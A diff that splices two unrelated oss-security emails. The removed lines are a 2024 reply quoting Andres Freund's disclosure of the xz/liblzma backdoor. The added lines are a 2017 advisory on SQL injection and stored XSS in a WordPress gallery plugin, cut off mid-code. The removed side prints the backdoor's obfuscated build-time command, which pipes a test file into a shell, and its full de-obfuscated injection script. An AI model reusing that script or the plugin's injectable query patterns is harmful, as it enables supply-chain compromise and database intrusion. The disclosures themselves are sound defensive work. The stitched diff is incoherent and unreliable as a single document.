@@ -1,4 +1,9 @@
-Received: (qmail 9690 invoked by uid 550); 29 Mar 2024 18:55:06 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["6119" "Wednesday" "5" "April" "2017" "19:00:03" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<27FD4B62-8D1D-449B-A3F6-3CE6780A3E2B@me.com>" "159" "[oss-security] Blind SQL Injection and persistent XSS in Wordpress plugin image-gallery-with-slideshow v1.5.2" nil nil nil "4" "2017040523:00:03" "[oss-security] Blind SQL Injection and persistent XSS in Wordpress plugin image-gallery-with-slideshow v1.5.2" (number mark "U       larry0@me.co Apr  5  159/6119  " thread-indent "\"[oss-security] Blind SQL Injection and persistent XSS in Wordpress plugin image-gallery-with-slideshow v1.5.2\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 5929 invoked by uid 550); 5 Apr 2017 23:00:19 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,550 +12,189 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 32582 invoked from network); 29 Mar 2024 18:54:23 -0000
-Date: Fri, 29 Mar 2024 19:54:14 +0100
-From: Ivan Delalande <colona@ycc.fr>
-To: oss-security@lists.openwall.com, Andres Freund <andres@anarazel.de>,
-	Andrew Morton <akpm@linux-foundation.org>
-Message-ID: <ZgcOVnk5hCVkDUt/@ycc.fr>
-References: <20240329155126.kjjfduxw2yrlxgzm@awork3.anarazel.de>
-MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Disposition: inline
-Content-Transfer-Encoding: 8bit
-In-Reply-To: <20240329155126.kjjfduxw2yrlxgzm@awork3.anarazel.de>
-User-Agent: Mutt/2.0.5 (2021-01-21)
-Subject: Re: [oss-security] backdoor in upstream xz/liblzma leading to ssh
- server compromise
+Received: (qmail 5897 invoked from network); 5 Apr 2017 23:00:17 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
+	t=1491433205; bh=MmTp/M45ZHv/kocu7K3iCfDYvyze599LYjnHZOZzc80=;
+	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
+	b=YdGaMbgxrzQq3lSxtoyOPXsXiwV1nhD3mwgzvEAZ3ee26EYfzDC+GKudZfAvBrdyS
+ B794JkUVI2owJytpNbsTwzZ+Sv+NaM+WOrieDfy0chy08R5RH87+RGOzmvau134lHU
+ pDbTeO1Ha5wd4378Dv9Uoy8Z8ahF1YcVm16wQ2XMqTGPdZKGr3Am8LbBJPeXsTY10t
+ gCSXCh3bOS5gmg8C8fEVuliknACdqLyxrHyuUNd500LXQay4If1d0mC/A/DqhTAvq5
+ 12x8dpb4k0Q/MH9qdmux/KCO+auVAl8IGARxHTozklyelFiZn9fDKDR3wB8Qepv8lH
+ 1KkFirqU7Ps5g==
+X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
+ definitions=2017-04-05_17:,, signatures=0
+X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
+ clxscore=1034 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
+ bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
+ engine=8.0.1-1701120000 definitions=main-1704050191
+From: "Larry W. Cashdollar" <larry0@me.com>
+Content-type: text/plain; charset=utf-8
+Content-transfer-encoding: quoted-printable
+Message-id: <27FD4B62-8D1D-449B-A3F6-3CE6780A3E2B@me.com>
+Date: Wed, 05 Apr 2017 19:00:03 -0400
+To: Open Source Security <oss-security@lists.openwall.com>
+MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
+X-Mailer: Apple Mail (2.3124)
+Subject: [oss-security] Blind SQL Injection and persistent XSS in Wordpress plugin
+ image-gallery-with-slideshow v1.5.2
 
-On Fri, Mar 29, 2024 at 08:51:26AM -0700, Andres Freund wrote:
-> For which the exploit code was then adjusted:
-> https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89
-> 
-> Given the activity over several weeks, the committer is either directly
-> involved or there was some quite severe compromise of their
-> system. Unfortunately the latter looks like the less likely explanation, given
-> they communicated on various lists about the "fixes" mentioned above.
+Title: Blind SQL Injection and persistent XSS in Wordpress plugin image-gal=
+lery-with-slideshow v1.5.2
+Author: Larry W. Cashdollar, @_larry0
+Date: 2017-04-01
+CVE-ID:[CVE-2017-1002011][CVE-2017-1002012][CVE-2017-1002013][CVE-2017-1002=
+014][CVE-2017-1002015]
+Download Site: https://wordpress.org/plugins/image-gallery-with-slideshow/
+Vendor: http://www.anblik.com/
+Vendor Notified: 2017-04-01
+Vendor Contact: https://twitter.com/anblik
+Advisory: http://www.vapidlabs.com/advisory.php?v=3D189
+Description: Image Gallery with Slideshow is a full integrated Image Galler=
+y and Slideshow plugin for WordPress.
+Vulnerability:
+CVE-2017-1002011:
 
-Knowing this, I hope the recent kernel patch series involving the same
-person to some degree will get extra scrutiny:
-https://lore.kernel.org/lkml/20240320183846.19475-1-lasse.collin@tukaani.org/t/
+There is a stored XSS vulnerability via the $value->gallery_name and $value=
+->gallery_description where anyone with privileges to modify or add galleri=
+es / images and inject javascript into the database.
 
-Thanks Andres, incredible find and write-up!
+145  <td><a class=3D"row-title" title=3D"Edit" href=3D"<?php echo bloginfo(=
+'url');?>/wp-admin/admin.php?page=3Dgallery_with_slideshow&val=3Dview&gid=
+=3D<?php echo $value->gallery_id;?>"><?php echo $value->gallery_name;?></a>=
+</td>
+146  <td>&nbsp;<?php echo $value->gallery_description;?></td>
+
+CVE-2017-1002012:
+
+In image-gallery-with-slideshow/admin_setting.php the following snippet of =
+code does not sanitize input via the gid variable before passing it into an=
+ SQL statement:
 
 
-On Fri, Mar 29, 2024 at 08:51:26AM -0700, Andres Freund wrote:
-> After observing a few odd symptoms around liblzma (part of the xz package) on
-> Debian sid installations over the last weeks (logins with ssh taking a lot of
-> CPU, valgrind errors) I figured out the answer:
-> 
-> The upstream xz repository and the xz tarballs have been backdoored.
-> 
-> At first I thought this was a compromise of debian's package, but it turns out
-> to be upstream.
-> 
-> 
-> == Compromised Release Tarball ==
-> 
-> One portion of the backdoor is *solely in the distributed tarballs*. For
-> easier reference, here's a link to debian's import of the tarball, but it is
-> also present in the tarballs for 5.6.0 and 5.6.1:
-> 
-> https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63
-> 
-> That line is *not* in the upstream source of build-to-host, nor is
-> build-to-host used by xz in git.  However, it is present in the tarballs
-> released upstream, except for the "source code" links, which I think github
-> generates directly from the repository contents:
-> 
-> https://github.com/tukaani-project/xz/releases/tag/v5.6.0
-> https://github.com/tukaani-project/xz/releases/tag/v5.6.1
-> 
-> 
-> This injects an obfuscated script to be executed at the end of configure. This
-> script is fairly obfuscated and data from "test" .xz files in the repository.
-> 
-> 
-> This script is executed and, if some preconditions match, modifies
-> $builddir/src/liblzma/Makefile to contain
-> 
-> am__test = bad-3-corrupt_lzma2.xz
-> ...
-> am__test_dir=$(top_srcdir)/tests/files/$(am__test)
-> ...
-> sed rpath $(am__test_dir) | $(am__dist_setup) >/dev/null 2>&1
-> 
-> 
-> which ends up as
-> ...; sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr "	 \-_" " 	_\-" | xz -d | /bin/bash >/dev/null 2>&1; ...
-> 
-> Leaving out the "| bash" that produces
-> 
-> ####Hello####
-> #��Z�.hj�
-> eval `grep ^srcdir= config.status`
-> if test -f ../../config.status;then
-> eval `grep ^srcdir= ../../config.status`
-> srcdir="../../$srcdir"
-> fi
-> export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +724)";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|xz -F raw --lzma1 -dc|/bin/sh
-> ####World####
-> 
-> After de-obfuscation this leads to the attached injected.txt.
-> 
-> 
-> == Compromised Repository ==
-> 
-> The files containing the bulk of the exploit are in an obfuscated form in
->   tests/files/bad-3-corrupt_lzma2.xz
->   tests/files/good-large_compressed.lzma
-> committed upstream. They were initially added in
-> https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0
-> 
-> Note that the files were not even used for any "tests" in 5.6.0.
-> 
-> 
-> Subsequently the injected code (more about that below) caused valgrind errors
-> and crashes in some configurations, due the stack layout differing from what
-> the backdoor was expecting.  These issues were attempted to be worked around
-> in 5.6.1:
-> 
-> https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad
-> https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f
-> https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92
-> 
-> For which the exploit code was then adjusted:
-> https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89
-> 
-> Given the activity over several weeks, the committer is either directly
-> involved or there was some quite severe compromise of their
-> system. Unfortunately the latter looks like the less likely explanation, given
-> they communicated on various lists about the "fixes" mentioned above.
-> 
-> 
-> Florian Weimer first extracted the injected code in isolation, also attached,
-> liblzma_la-crc64-fast.o, I had only looked at the whole binary. Thanks!
-> 
-> 
-> == Affected Systems ==
-> 
-> The attached de-obfuscated script is invoked first after configure, where it
-> decides whether to modify the build process to inject the code.
-> 
-> These conditions include targeting only x86-64 linux:
->     if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
-> 
-> Building with gcc and the gnu linker
->     if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
->     exit 0
->     fi
->     if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
->     exit 0
->     fi
->     LDv=$LD" -v"
->     if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
->     exit 0
-> 
-> Running as part of a debian or RPM package build:
->     if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
-> 
-> Particularly the latter is likely aimed at making it harder to reproduce the
-> issue for investigators.
-> 
-> 
-> Due to the working of the injected code (see below), it is likely the backdoor
-> can only work on glibc based systems.
-> 
-> 
-> Luckily xz 5.6.0 and 5.6.1 have not yet widely been integrated by linux
-> distributions, and where they have, mostly in pre-release versions.
-> 
-> 
-> == Observing Impact on openssh server ==
-> 
-> With the backdoored liblzma installed, logins via ssh become a lot slower.
-> 
-> time ssh nonexistant@localhost
-> 
-> before:
-> nonexistant@localhost: Permission denied (publickey).
-> 
-> before:
-> real	0m0.299s
-> user	0m0.202s
-> sys	0m0.006s
-> 
-> after:
-> nonexistant@localhost: Permission denied (publickey).
-> 
-> real	0m0.807s
-> user	0m0.202s
-> sys	0m0.006s
-> 
-> 
-> openssh does not directly use liblzma. However debian and several other
-> distributions patch openssh to support systemd notification, and libsystemd
-> does depend on lzma.
-> 
-> 
-> Initially starting sshd outside of systemd did not show the slowdown, despite
-> the backdoor briefly getting invoked. This appears to be part of some
-> countermeasures to make analysis harder.
-> 
-> Observed requirements for the exploit:
-> a) TERM environment variable is not set
-> b) argv[0] needs to be /usr/sbin/sshd
-> c) LD_DEBUG, LD_PROFILE are not set
-> d) LANG needs to be set
-> e) Some debugging environments, like rr, appear to be detected. Plain gdb
->    appears to be detected in some situations, but not others
-> 
-> To reproduce outside of systemd, the server can be started with a clear
-> environment, setting only the required variable:
-> 
-> env -i LANG=en_US.UTF-8 /usr/sbin/sshd -D
-> 
-> 
-> In fact, openssh does not need to be started as a server to observe the
-> slowdown:
-> 
-> slow:
-> env -i LANG=C /usr/sbin/sshd -h
-> 
-> (about 0.5s on my older system)
-> 
-> 
-> fast:
-> env -i LANG=C TERM=foo /usr/sbin/sshd -h
-> env -i LANG=C LD_DEBUG=statistics /usr/sbin/sshd -h
-> ...
-> 
-> (about 0.01s on the same system)
-> 
-> 
-> It's possible that argv[0] other /usr/sbin/sshd also would have effect - there
-> are obviously lots of servers linking to libsystemd.
-> 
-> 
-> == Analyzing the injected code ==
-> 
-> I am *not* a security researcher, nor a reverse engineer.  There's lots of
-> stuff I have not analyzed and most of what I observed is purely from
-> observation rather than exhaustively analyzing the backdoor code.
-> 
-> To analyze I primarily used "perf record -e intel_pt//ub" to observe where
-> execution diverges between the backdoor being active and not. Then also gdb,
-> setting breakpoints before the divergence.
-> 
-> 
-> The backdoor initially intercepts execution by replacing the ifunc resolvers
-> crc32_resolve(), crc64_resolve() with different code, which calls
-> _get_cpuid(), injected into the code (which previously would just be static
-> inline functions).  In xz 5.6.1 the backdoor was further obfuscated, removing
-> symbol names.
-> 
-> These functions get resolved during startup, because sshd is built with
-> -Wl,-z,now, leading to all symbols being resolved early. If started with
-> LD_BIND_NOT=1 the backdoor does not appear to work.
-> 
-> 
-> Below crc32_resolve() _get_cpuid() does not do much, it just sees that a
-> 'completed' variable is 0 and increments it, returning the normal cpuid result
-> (via a new _cpuid()). It gets to be more interesting during crc64_resolve().
-> 
-> In the second invocation crc64_resolve() appears to find various information,
-> like data from the dynamic linker, program arguments and environment. Then it
-> perform various environment checks, including those above. There are other
-> checks I have not fully traced.
-> 
-> If the above decides to continue, the code appears to be parsing the symbol
-> tables in memory. This is the quite slow step that made me look into the issue.
-> 
-> 
-> Notably liblzma's symbols are resolved before many of the other libraries,
-> including the symbols in the main sshd binary.  This is important because
-> symbols are resolved, the GOT gets remapped read-only thanks to -Wl,-z,relro.
-> 
-> 
-> To be able to resolve symbols in libraries that have not yet loaded, the
-> backdoor installs an audit hook into the dynamic linker, which can be observed
-> with gdb using
->   watch _rtld_global_ro._dl_naudit
-> It looks like the audit hook is only installed for the main binary.
-> 
-> That hook gets called, from _dl_audit_symbind, for numerous symbols in the
-> main binary. It appears to wait for "RSA_public_decrypt@got.plt" to be
-> resolved.  When called for that symbol, the backdoor changes the value of
-> RSA_public_decrypt@got.plt to point to its own code.  It does not do this via
-> the audit hook mechanism, but outside of it.
-> 
-> For reasons I do not yet understand, it does change sym.st_value *and* the
-> return value of from the audit hook to a different value, which leads
-> _dl_audit_symbind() to do nothing - why change anything at all then?
-> 
-> After that the audit hook is uninstalled again.
-> 
-> It is possible to change the got.plt contents at this stage because it has not
-> (and can't yet) been remapped to be read-only.
-> 
-> 
-> I suspect there might be further changes performed at this stage.
-> 
-> 
-> == Impact on sshd ==
-> 
-> The prior section explains that RSA_public_decrypt@got.plt was redirected to
-> point into the backdoor code. The trace I was analyzing indeed shows that
-> during a pubkey login the exploit code is invoked:
-> 
->             sshd 1736357 [010] 714318.734008:          1  branches:uH:      5555555ded8c ssh_rsa_verify+0x49c (/usr/sbin/sshd) =>     5555555612d0 RSA_public_decrypt@plt+0x0 (/usr/sbin/sshd)
-> 
-> The backdoor then calls back into libcrypto, presumably to perform normal authentication
-> 
->             sshd 1736357 [010] 714318.734009:          1  branches:uH:      7ffff7c137cd [unknown] (/usr/lib/x86_64-linux-gnu/liblzma.so.5.6.0) =>     7ffff792a2b0 RSA_get0_key+0x0 (/usr/lib/x86_64-linux-gnu/libcrypto.so.3)
-> 
-> 
-> I have not yet analyzed precisely what is being checked for in the injected
-> code, to allow unauthorized access. Since this is running in a
-> pre-authentication context, it seems likely to allow some form of access or
-> other form of remote code execution.
-> 
-> I'd upgrade any potentially vulnerable system ASAP.
-> 
-> 
-> == Bug reports ==
-> 
-> Given the apparent upstream involvement I have not reported an upstream
-> bug. As I initially thought it was a debian specific issue, I sent a more
-> preliminary report to security@debian.org.  Subsequently I reported the issue
-> to distros@. CISA was notified by a distribution.
-> 
-> Red Hat assigned this issue CVE-2024-3094.
-> 
-> 
-> == Detecting if installation is vulnerable ==
-> 
-> Vegard Nossum wrote a script to detect if it's likely that the ssh binary on a
-> system is vulnerable, attached here. Thanks!
-> 
-> 
-> Greetings,
-> 
-> Andres Freund
+173 if($_REQUEST['val'] =3D=3D 'view')
+174 {
+175         $path_value =3D get_combo_path_value();
+176         $id =3D $_REQUEST['gid'];
+177         global $wpdb;
+178         $table_prefix =3D $wpdb->prefix;
+179         $result =3D $wpdb->get_results("SELECT ig.gallery_name,ii.image=
+_id,ii.original_name,ii.image_name,ii.gallery_id,ii.image_title,ii.link_url=
+,ii.image_description FROM `".$table_prefix."combo_gallery` AS ig,`".$table=
+_prefix."combo_image` AS ii WHERE ig.gallery_   id=3Dii.gallery_id AND ii.g=
+allery_id =3D".$id);
 
-> P="-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
-> C="pic_flag=\" $P\""
-> O="^pic_flag=\" -fPIC -DPIC\"$"
-> R="is_arch_extension_supported"
-> x="__get_cpuid("
-> p="good-large_compressed.lzma"
-> U="bad-3-corrupt_lzma2.xz"
-> eval $zrKcVq
-> if test -f config.status; then
-> eval $zrKcSS
-> eval `grep ^LD=\'\/ config.status`
-> eval `grep ^CC=\' config.status`
-> eval `grep ^GCC=\' config.status`
-> eval `grep ^srcdir=\' config.status`
-> eval `grep ^build=\'x86_64 config.status`
-> eval `grep ^enable_shared=\'yes\' config.status`
-> eval `grep ^enable_static=\' config.status`
-> eval `grep ^gl_path_map=\' config.status`
-> eval $zrKccj
-> if ! grep -qs '\["HAVE_FUNC_ATTRIBUTE_IFUNC"\]=" 1"' config.status > /dev/null 2>&1;then
-> exit 0
-> fi
-> if ! grep -qs 'define HAVE_FUNC_ATTRIBUTE_IFUNC 1' config.h > /dev/null 2>&1;then
-> exit 0
-> fi
-> if test "x$enable_shared" != "xyes";then
-> exit 0
-> fi
-> if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
-> exit 0
-> fi
-> if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc64_fast.c > /dev/null 2>&1; then
-> exit 0
-> fi
-> if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc32_fast.c > /dev/null 2>&1; then
-> exit 0
-> fi
-> if ! grep -qs "$R" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
-> exit 0
-> fi
-> if ! grep -qs "$x" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
-> exit 0
-> fi
-> if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
-> exit 0
-> fi
-> if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
-> exit 0
-> fi
-> LDv=$LD" -v"
-> if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
-> exit 0
-> fi
-> if ! test -f "$srcdir/tests/files/$p" > /dev/null 2>&1;then
-> exit 0
-> fi
-> if ! test -f "$srcdir/tests/files/$U" > /dev/null 2>&1;then
-> exit 0
-> fi
-> if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
-> eval $zrKcst
-> j="^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4"
-> if ! grep -qs "$j" src/liblzma/Makefile > /dev/null 2>&1;then
-> exit 0
-> fi
-> z="^am__uninstall_files_from_dir = {"
-> if ! grep -qs "$z" src/liblzma/Makefile > /dev/null 2>&1;then
-> exit 0
-> fi
-> w="^am__install_max ="
-> if ! grep -qs "$w" src/liblzma/Makefile > /dev/null 2>&1;then
-> exit 0
-> fi
-> E=$z
-> if ! grep -qs "$E" src/liblzma/Makefile > /dev/null 2>&1;then
-> exit 0
-> fi
-> Q="^am__vpath_adj_setup ="
-> if ! grep -qs "$Q" src/liblzma/Makefile > /dev/null 2>&1;then
-> exit 0
-> fi
-> M="^am__include = include"
-> if ! grep -qs "$M" src/liblzma/Makefile > /dev/null 2>&1;then
-> exit 0
-> fi
-> L="^all: all-recursive$"
-> if ! grep -qs "$L" src/liblzma/Makefile > /dev/null 2>&1;then
-> exit 0
-> fi
-> m="^LTLIBRARIES = \$(lib_LTLIBRARIES)"
-> if ! grep -qs "$m" src/liblzma/Makefile > /dev/null 2>&1;then
-> exit 0
-> fi
-> u="AM_V_CCLD = \$(am__v_CCLD_\$(V))"
-> if ! grep -qs "$u" src/liblzma/Makefile > /dev/null 2>&1;then
-> exit 0
-> fi
-> if ! grep -qs "$O" libtool > /dev/null 2>&1;then
-> exit 0
-> fi
-> eval $zrKcTy
-> b="am__test = $U"
-> sed -i "/$j/i$b" src/liblzma/Makefile || true
-> d=`echo $gl_path_map | sed 's/\\\/\\\\\\\\/g'`
-> b="am__strip_prefix = $d"
-> sed -i "/$w/i$b" src/liblzma/Makefile || true
-> b="am__dist_setup = \$(am__strip_prefix) | xz -d 2>/dev/null | \$(SHELL)"
-> sed -i "/$E/i$b" src/liblzma/Makefile || true
-> b="\$(top_srcdir)/tests/files/\$(am__test)"
-> s="am__test_dir=$b"
-> sed -i "/$Q/i$s" src/liblzma/Makefile || true
-> h="-Wl,--sort-section=name,-X"
-> if ! echo "$LDFLAGS" | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
-> h=$h",-z,now"
-> fi
-> j="liblzma_la_LDFLAGS += $h"
-> sed -i "/$L/i$j" src/liblzma/Makefile || true
-> sed -i "s/$O/$C/g" libtool || true
-> k="AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))"
-> sed -i "s/$u/$k/" src/liblzma/Makefile || true
-> l="LTDEPS='\$(lib_LTDEPS)'; \\\\\n\
->     export top_srcdir='\$(top_srcdir)'; \\\\\n\
->     export CC='\$(CC)'; \\\\\n\
->     export DEFS='\$(DEFS)'; \\\\\n\
->     export DEFAULT_INCLUDES='\$(DEFAULT_INCLUDES)'; \\\\\n\
->     export INCLUDES='\$(INCLUDES)'; \\\\\n\
->     export liblzma_la_CPPFLAGS='\$(liblzma_la_CPPFLAGS)'; \\\\\n\
->     export CPPFLAGS='\$(CPPFLAGS)'; \\\\\n\
->     export AM_CFLAGS='\$(AM_CFLAGS)'; \\\\\n\
->     export CFLAGS='\$(CFLAGS)'; \\\\\n\
->     export AM_V_CCLD='\$(am__v_CCLD_\$(V))'; \\\\\n\
->     export liblzma_la_LINK='\$(liblzma_la_LINK)'; \\\\\n\
->     export libdir='\$(libdir)'; \\\\\n\
->     export liblzma_la_OBJECTS='\$(liblzma_la_OBJECTS)'; \\\\\n\
->     export liblzma_la_LIBADD='\$(liblzma_la_LIBADD)'; \\\\\n\
-> sed rpath \$(am__test_dir) | \$(am__dist_setup) >/dev/null 2>&1";
-> sed -i "/$m/i$l" src/liblzma/Makefile || true
-> eval $zrKcHD
-> fi
-> elif (test -f .libs/liblzma_la-crc64_fast.o) && (test -f .libs/liblzma_la-crc32_fast.o); then
-> eval $zrKcKQ
-> if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc64_fast.c; then
-> exit 0
-> fi
-> if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc32_fast.c; then
-> exit 0
-> fi
-> if ! grep -qs "$R" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
-> exit 0
-> fi
-> if ! grep -qs "$x" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
-> exit 0
-> fi
-> if ! grep -qs "$C" ../../libtool; then
-> exit 0
-> fi
-> if ! echo $liblzma_la_LINK | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
-> exit 0
-> fi
-> if echo $liblzma_la_LINK | grep -qs -e "lazy" > /dev/null 2>&1;then
-> exit 0
-> fi
-> N=0
-> W=0
-> Y=`grep "dnl Convert it to C string syntax." $top_srcdir/m4/gettext.m4`
-> eval $zrKcjv
-> if test -z "$Y"; then
-> N=0
-> W=88792
-> else
-> N=88792
-> W=0
-> fi
-> xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" | LC_ALL=C awk 'BEGIN{FS="\n";RS="\n";ORS="";m=256;for(i=0;i<m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l<4096;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t["x" (NF<1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf "%c",(v+k)%m}' | xz -dc --single-stream | ((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o || true
-> if ! test -f liblzma_la-crc64-fast.o; then
-> exit 0
-> fi
-> cp .libs/liblzma_la-crc64_fast.o .libs/liblzma_la-crc64-fast.o || true
-> V='#endif\n#if defined(CRC32_GENERIC) && defined(CRC64_GENERIC) && defined(CRC_X86_CLMUL) && defined(CRC_USE_IFUNC) && defined(PIC) && (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\nextern int _get_cpuid(int, void*, void*, void*, void*, void*);\nstatic inline bool _is_arch_extension_supported(void) { int success = 1; uint32_t r[4]; success = _get_cpuid(1, &r[0], &r[1], &r[2], &r[3], ((char*) __builtin_frame_address(0))-16); const uint32_t ecx_mask = (1 << 1) | (1 << 9) | (1 << 19); return success && (r[2] & ecx_mask) == ecx_mask; }\n#else\n#define _is_arch_extension_supported is_arch_extension_supported'
-> eval $yosA
-> if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc64_fast.c | \
-> sed "/include \"crc_x86_clmul.h\"/a \\$V" | \
-> sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc64_fast.c\"" 2>/dev/null | \
-> $CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r liblzma_la-crc64-fast.o -x c -  $P -o .libs/liblzma_la-crc64_fast.o 2>/dev/null; then
-> cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o || true
-> eval $BPep
-> if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc32_fast.c | \
-> sed "/include \"crc32_arm64.h\"/a \\$V" | \
-> sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc32_fast.c\"" 2>/dev/null | \
-> $CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r -x c -  $P -o .libs/liblzma_la-crc32_fast.o; then
-> eval $RgYB
-> if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then
-> if test ! -f .libs/liblzma.so; then
-> mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
-> mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
-> fi
-> rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* || true
-> else
-> mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
-> mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
-> fi
-> rm -f .libs/liblzma_la-crc32-fast.o || true
-> rm -f .libs/liblzma_la-crc64-fast.o || true
-> else
-> mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
-> mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
-> fi
-> else
-> mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
-> fi
-> rm -f liblzma_la-crc64-fast.o || true
-> fi
-> eval $DHLd
 
--- 
-Ivan Delalande
+255 if($_REQUEST['val'] =3D=3D 'edit')
+256 {
+257         $id =3D $_REQUEST['gid'];
+258         global $wpdb;
+259         $table_prefix =3D $wpdb->prefix;
+=2E
+=2E
+=2E
+270         $edit_result =3D $wpdb->get_results("SELECT * FROM `".$table_pr=
+efix."combo_gallery` WHERE gallery_id =3D ".$id);
+
+CVE-2017-1002013:
+Blind SQL Injection via imgid parameter.
+
+301 if($_REQUEST['val'] =3D=3D 'imgedit')
+302 {
+303         $id =3D $_REQUEST['imgid'];
+304         $gid =3D $_REQUEST['gid'];
+305         global $wpdb;
+=2E
+=2E
+309         if(isset($_REQUEST['edit_image_submit']))
+310         {
+=2E
+=2E
+=2E
+318         $edit_img_result =3D $wpdb->get_results("SELECT * FROM `".$tabl=
+e_prefix."combo_image` WHERE image_id =3D ".$id);
+
+
+361 if($_REQUEST['gval'] =3D=3D 'delete')
+362 {
+363         $id =3D $_REQUEST['gid'];
